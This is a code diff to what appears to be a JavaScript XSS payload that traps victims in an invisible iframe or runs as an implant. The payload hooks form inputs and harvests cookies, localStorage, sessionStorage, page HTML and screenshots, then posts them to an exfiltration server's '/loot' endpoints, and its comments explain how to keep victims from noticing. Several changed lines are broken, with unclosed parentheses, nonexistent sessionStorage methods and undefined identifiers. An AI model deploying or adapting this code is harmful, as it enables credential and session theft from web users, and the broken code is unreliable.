@@ -6,31 +6,44 @@
 
 // *******************************************************************************
 
-function initGlobals()
+function initTaperVars()
 {
-	console.log("Initializing globals...");
-	// Ue fullscreen for actual prod usage
-	// not fullscreen shows the XSS laden landing
+	console.log("Initializing storage...");
 
-	// page in the background so you can 
-	// tell if you're still where you need to be during
-	// development. 
-	window.taperfullscreenIframe = true; // Set to true for production use, false for dev
-	// Whether or not to copy screenshots to background
-	// Can make transitions smoother. Sometimes the
-	// background page of the iFrame trap flashes through
-	// when navigating the app. This hides that a bit
-	// by copying the image to the background
-	window.tapersetBackgroundImage = true;
+	// Set to trap for iFrame trap, where
+	// the payload needs to try to keep it's
+	// own persistence. 
+	// Set to implant for assume persistence
+	// like adding directly to the javascript
+	// on the application server. 
+	// Setting: trap or implant
+	window.taperMode = implant;
 
-	// What page in the application to start users in
-	// Note that if the trap is loading from
-	// a reload, it hopefully will automatically
-	// load the page the user was on in the iframe
-	// when they reloaded the page. Otherwise,
-	// they'll start here
-	window.taperstartingPage = "https://targetapp.possiblymalware.com/wp-admin";
 
+	if (window.taperMode === trap)
+	{
+		// Ue fullscreen for actual prod usage
+		// not fullscreen shows the XSS laden landing
+
+		// page in the background so you can 
+		// tell if you're still where you need to be during
+		// development. 
+		window.taperfullscreenIframe = true; // Set to true for production use, false for dev
+		// Whether or not to copy screenshots to background
+		// Can make transitions smoother. Sometimes the
+		// background page of the iFrame trap flashes through
+		// when navigating the app. This hides that a bit
+		// by copying the image to the background
+		window.tapersetBackgroundImage = true;
+
+		// What page in the application to start users in
+		// Note that if the trap is loading from
+		// a reload, it hopefully will automatically
+		// load the page the user was on in the iframe
+		// when they reloaded the page. Otherwise,
+		// they'll start here
+		window.taperstartingPage = "https://targetapp.possiblymalware.com/wp-admin";
+	}
 
 	// Exfil server
 	window.taperexfilServer = "https://192.168.2.61:8444";
@@ -39,28 +52,40 @@ function initGlobals()
 	window.taperexfilHTML = true;
 
 
+	// The following bits need session persistance
+	// so they go in session storage instead of a 
+	// a windows global variable. 
 
-	// Helpful variables
-	window.taperlastFakeUrl = "";
 
+	if (window.taperMode === trap)
+	{
+		sessionStorage.setKey('taperLastUrl', '');
+		//window.taperlastUrl = "";
+	}
 
 	// Slow down the html2canvas
 	window.taperloaded = false;
 
 
+
+
 	// Client session
-	window.tapersessionName = "";
+	sessionStorage.setKey('taperSessionName', '');
+	//window.tapersessionName = "";
 
 	// Cookie storage
-	window.tapercookieStorageDict = {};
+	sessionStorage.setKey('taperCookieStorage', '');
+	//window.tapercookieStorageDict = {};
 
 
 	// Local storage
-	window.taperlocalStorageDict = {};
+	sessionStorage.setKey('taperLocalStorage', '');
+	//window.taperlocalStorageDict = {};
 
 
 	// Session storage
-	window.tapersessionStorageDict = {};
+	sessionStorage.setKey('taperSessionStorage', '');
+	//window.tapersessionStorageDict = {};
 }
 
 
@@ -166,7 +191,9 @@ function initSession()
 	var adjective = AdjectiveList[Math.floor(Math.random()*AdjectiveList.length)];
 	var color = ColorList[Math.floor(Math.random()*ColorList.length)];
 	var murderer = MurderCritter[Math.floor(Math.random()*MurderCritter.length)];
+	
 	tapersessionName = adjective + "-" + color + "-" + murderer;
+	sessionStorage.setKey('taperSessionName', tapersessionName);
 }
 
 
@@ -191,7 +218,7 @@ function sendScreenshot()
 
 		//console.log("About to send image....");
 		request = new XMLHttpRequest();request.addEventListener("load", responseHandler);
-		request.open("POST", taperexfilServer + "/loot/screenshot/" + tapersessionName);
+		request.open("POST", taperexfilServer + "/loot/screenshot/" + sessionStorage.getKey('taperSessionName');
 
 
 		// Helps hide flashing of the page when clicking around
@@ -221,7 +248,19 @@ function sendScreenshot()
 // events multiple times
 function hookInputs()
 {
-	inputs = document.getElementById("iframe_a").contentDocument.getElementsByTagName('input');
+	if (window.taperMode === trap)
+	{
+		// User inputs are down in the iframe trap
+		inputs = document.getElementById("iframe_a").contentDocument.getElementsByTagName('input');
+	}
+	else
+	{
+		// We're running in implant mode, grab inputs
+		// from main page. 
+		inputs = document.getElementsByTagName('input');
+	}
+
+
 	for (index = 0; index < inputs.length; index++)
 	{
 		// Check to see if we've already hooked the input field. 
@@ -239,7 +278,7 @@ function hookInputs()
 				inputName = this.name;
 				inputValue = this.value;
 				request = new XMLHttpRequest();
-				request.open("POST", taperexfilServer + "/loot/input/" + tapersessionName);
+				request.open("POST", taperexfilServer + "/loot/input/" + sessionStorage.getKey('taperSessionName');
 				request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 				var jsonObj = new Object();
 				jsonObj["inputName"] = inputName;
@@ -256,6 +295,10 @@ function hookInputs()
 // Check for cookies, see if values
 // have been added or changed
 // Only update backend if new cookie or value changed.
+
+//indow.localStorage.setItem("meta", JSON.stringify(meta));
+//var meta1 = JSON.parse(window.localStorage.getItem("meta"));
+
 function checkCookies()
 {
 	cookieArray = document.cookie.split(';');
@@ -269,15 +312,17 @@ function checkCookies()
 		cookieName = cookieData[0];
 		cookieValue = cookieData[1];
 		// console.log("!!!!!   Checking cookies for: " + cookieName + ", " + cookieValue);
-		if (cookieName in tapercookieStorageDict)
+
+		cookieDict = JSON.parse(sessionStorage.getKey('taperCookieStorage');
+		if (cookieName in cookieDict)
 		{
 			// console.log("== Existing cookie: " + cookieName);
-			if (tapercookieStorageDict[cookieName] != cookieValue)
+			if (cookieDict[cookieName] != cookieValue)
 			{
 				// Existing cookie, but the value has changed
 				// console.log("     New cookie value: " + cookieValue);
 				// console.log("     Old cookie value: " + cookieStorageDict[cookieName]);
-				tapercookieStorageDict[cookieName] = cookieValue;
+				cookieDict[cookieName] = cookieValue;
 			}
 			else
 			{
@@ -290,12 +335,15 @@ function checkCookies()
 		{
 			// New cookie detected
 			// console.log("++ New cookie: " + cookieName + ", with value: " + cookieValue);
-			tapercookieStorageDict[cookieName] = cookieValue;
+			cookieDict[cookieName] = cookieValue;
 		}
+
+		// Copy dictionary back to session storage
+		sessionStorage.setKey('taperCookieStorage', JSON.stringify(cookieDict));
 
 		// Ship it
 		request = new XMLHttpRequest();
-		request.open("POST", taperexfilServer + "/loot/dessert/" + tapersessionName);
+		request.open("POST", taperexfilServer + "/loot/dessert/" + sessionStorage.getKey('taperSessionName');
 		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 		var jsonObj = new Object();
 		jsonObj["cookieName"] = cookieName;
@@ -317,16 +365,18 @@ function checkLocalStorage()
 		value = localStorage.getItem(key)
 		//console.log("~~~ Local storage: {" + key + ", " + value + "}");
 
-		if (key in taperlocalStorageDict)
+		localStorageDict = JSON.parse(sessionStorage.getKey('taperLocalStorage');
+
+		if (key in localStorageDict)
 		{
 			// Existing local storage key
 			//console.log("!!! Existing localstorage key...");
-			if (taperlocalStorageDict[key] != value)
+			if (localStorageDict[key] != value)
 			{
 				// Existing localStorage, but the value has changed
 				// console.log("     New localStorage value: " + value);
 				// console.log("     Old localStorage value: " + localStorageDict[key]);
-				taperlocalStorageDict[key] = value;
+				localStorageDict[key] = value;
 			}
 			else
 			{
@@ -340,13 +390,16 @@ function checkLocalStorage()
 		{
 			// New localStorage entry
 			//console.log("++ New localStorage: " + key + ", with value: " + value);
-			taperlocalStorageDict[key] = value;
+			localStorageDict[key] = value;
 		}
+
+		// Copy dictionary back to session storage
+		sessionStorage.setKey('taperLocalStorage', JSON.stringify(localStorageDict));
 
 
 		// Ship it
 		request = new XMLHttpRequest();
-		request.open("POST", taperexfilServer + "/loot/localstore/" + tapersessionName);
+		request.open("POST", taperexfilServer + "/loot/localstore/" + sessionStorage.getKey('tapersessionName');
 		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 		var jsonObj = new Object();
 		jsonObj["key"] = key;
@@ -369,16 +422,19 @@ function checkSessionStorage()
 		value = sessionStorage.getItem(key)
 		// console.log("~~~ Session storage: {" + key + ", " + value + "}");
 
-		if (key in tapersessionStorageDict)
+
+		sessionStorageDict = JSON.parse(sessionStorage.getKey('taperSessionStorage');
+
+		if (key in sessionStorageDict)
 		{
 			// Existing local storage key
 			//console.log("!!! Existing localstorage key...");
-			if (tapersessionStorageDict[key] != value)
+			if (sessionStorageDict[key] != value)
 			{
 				// Existing localStorage, but the value has changed
 				 // console.log("     New sessionStorage value: " + value);
 				 // console.log("     Old sessionStorage value: " + sessionStorageDict[key]);
-				tapersessionStorageDict[key] = value;
+				sessionStorageDict[key] = value;
 			}
 			else
 			{
@@ -392,13 +448,16 @@ function checkSessionStorage()
 		{
 			// New localStorage entry
 			// console.log("++ New sessionStorage: " + key + ", with value: " + value);
-			tapersessionStorageDict[key] = value;
+			sessionStorageDict[key] = value;
 		}
+
+		// Copy dictionary back to session storage
+		sessionStorage.setKey('taperSessionStorage', JSON.stringify(sessionStorageDict));
 
 
 		// Ship it
 		request = new XMLHttpRequest();
-		request.open("POST", taperexfilServer + "/loot/sessionstore/" + tapersessionName);
+		request.open("POST", taperexfilServer + "/loot/sessionstore/" + sessionStorage.getKey('tapersessionName');
 		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 		var jsonObj = new Object();
 		jsonObj["key"] = key;
@@ -413,11 +472,20 @@ function checkSessionStorage()
 // Optional, copy the entire HTML and send out
 function sendHTML()
 {
-	trapURL = document.getElementById("iframe_a").contentDocument.location.href;
-	trapHTML = document.getElementById("iframe_a").contentDocument.documentElement.outerHTML;
+	if(window.taperMode === trap)
+	{
+		// iframe trap mode
+		trapURL = document.getElementById("iframe_a").contentDocument.location.href;
+		trapHTML = document.getElementById("iframe_a").contentDocument.documentElement.outerHTML;		
+	}
+	else
+	{
+		// implant mode
+		trapHTML = document.outerHTML;
+	}
 
 	request = new XMLHttpRequest();
-	request.open("POST", taperexfilServer + "/loot/html/" + tapersessionName);
+	request.open("POST", taperexfilServer + "/loot/html/" + sessionStorage.getKey('taperSessionName');
 	request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 	var jsonObj = new Object();
 	jsonObj["url"] = trapURL;
@@ -438,41 +506,47 @@ function sendHTML()
 // iframe trap, not the one with the XSS vuln. 
 function runUpdate()
 {
-	// iFrame trap disable code
-	if (!canAccessIframe(document.getElementById("iframe_a")))
+	if (taperMode === "trap")
 	{
-		// If we can't access the iframe anymore, that 
-		// means the iframe has changed origin. They 
-		// surfed away to a new domain, probably through a link
-		// 
-		// This is bad, the new page won't load in the iframe trap
-		// and will throw very obvious errors on their page
-		// indicating something isn't right  
-		//
-		// Safest thing is the kill the iframe trap and hope
-		// no one notices. We'll reload the parent page to the current 
-		// iframe page. It'll seem like clicking the link to the 
-		// external page didn't work, but the second click will. 
-		// First click exits the iframe, reloads the normally. 
-		// Second click will properly load the external page. 
-		// Sad to lose the trap through. 
-		window.location = taperlastFakeUrl;
+		// iFrame trap mode
+		// iFrame trap disable code
+		if (!canAccessIframe(document.getElementById("iframe_a")))
+		{
+			// If we can't access the iframe anymore, that 
+			// means the iframe has changed origin. They 
+			// surfed away to a new domain, probably through a link
+			// 
+			// This is bad, the new page won't load in the iframe trap
+			// and will throw very obvious errors on their page
+			// indicating something isn't right  
+			//
+			// Safest thing is the kill the iframe trap and hope
+			// no one notices. We'll reload the parent page to the current 
+			// iframe page. It'll seem like clicking the link to the 
+			// external page didn't work, but the second click will. 
+			// First click exits the iframe, reloads the normally. 
+			// Second click will properly load the external page. 
+			// Sad to lose the trap through. 
+			window.location = sessionStorage.getKey('taperLastUrl');
+		}
+
+		var fakeUrl = document.getElementById("iframe_a").contentDocument.location.pathname;
+		var fullUrl = document.getElementById("iframe_a").contentDocument.location.href;
+
 	}
 
 
 
-	var fakeUrl = document.getElementById("iframe_a").contentDocument.location.pathname;
-	var fullUrl = document.getElementById("iframe_a").contentDocument.location.href;
 	// console.log("$$$ Location: " + document.getElementById("iframe_a").contentDocument.location);
 	// console.log("$$$ Path: " + document.getElementById("iframe_a").contentDocument.location.pathname);
 	// console.log("$$$ href: " + document.getElementById("iframe_a").contentDocument.location.href);
 
 	// New page, let's steal stuff
-	if (taperlastFakeUrl != fakeUrl)
+	if (taperlastUrl != fakeUrl)
 	{
 		// Handle URL recording
 		console.log("New trap URL, stealing the things: " + fakeUrl);
-		taperlastFakeUrl = fakeUrl;
+		taperlastUrl = fakeUrl;
 
 		// This needs an API call to report the new page
 		// and take a screenshot maybe, not sure if
@@ -614,7 +688,7 @@ if (window.taperClaimDebug != true)
 	// });
 
 	
-	initGlobals();
+	initTaperVars();
 
 	console.log("!!!! Loading payload!");
 // Blank the page so it doesn't show through as users 
